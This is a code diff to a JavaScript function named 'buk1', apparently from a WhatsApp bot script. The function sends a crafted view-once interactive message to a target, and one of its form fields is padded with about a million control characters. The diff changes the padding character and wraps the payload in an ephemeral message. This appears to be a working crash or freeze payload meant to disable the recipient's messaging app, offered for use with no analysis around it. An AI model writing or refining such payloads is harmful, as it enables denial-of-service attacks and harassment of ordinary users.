@@ -229,6 +229,8 @@ participant: { jid : target }
 exports.buk1 = async (viper, target, text, amount, ptcp = true) => {
     await viper.relayMessage(target, 
         {
+        ephemeralMessage: {
+          message: {
             viewOnceMessage: {
                 message: {
                     interactiveResponseMessage: {
@@ -238,12 +240,14 @@ exports.buk1 = async (viper, target, text, amount, ptcp = true) => {
                         },
                         nativeFlowResponseMessage: {
                             name: 'galaxy_message',
-                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                             version: 3
                         }
                     }
                 }
             }
+           }
+          }
         }, 
         ptcp ? { participant: { jid: target } } : {}
     );
